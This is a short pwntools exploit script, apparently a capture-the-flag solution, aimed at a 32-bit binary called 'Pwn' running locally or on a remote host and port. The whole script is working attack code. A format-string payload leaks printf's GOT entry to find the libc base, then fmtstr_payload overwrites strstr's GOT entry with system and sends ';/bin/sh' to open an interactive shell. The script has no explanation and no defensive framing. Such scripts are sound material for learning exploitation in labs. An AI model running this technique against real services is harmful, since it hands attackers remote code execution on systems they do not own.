from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./Pwn")
	libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")
	elf = ELF("./Pwn")
else:
	p = remote("192.168.21.120","9999")
	libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")
	elf = ELF("./Pwn")

def debugf():
	if debug:
		gdb.attach(p,"b printf")

context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
debugf()
payload = p32(elf.got["printf"]) + "%{offset}$s\x00".format(offset = 0x1f - 1)
p.sendafter("or input 'quit' to leave\n",payload)
p.recv(4)
leak_addr = u32(p.recv(4))
libc.address = leak_addr - libc.symbols["printf"]
log.success("libc_base:" + hex(libc.address))
payload = fmtstr_payload(0x1f - 1,{elf.got["strstr"]:libc.symbols["system"]}) + ";/bin/sh\x00"
p.sendafter("or input 'quit' to leave\n",payload)
p.recvuntil("not found")
p.interactive()
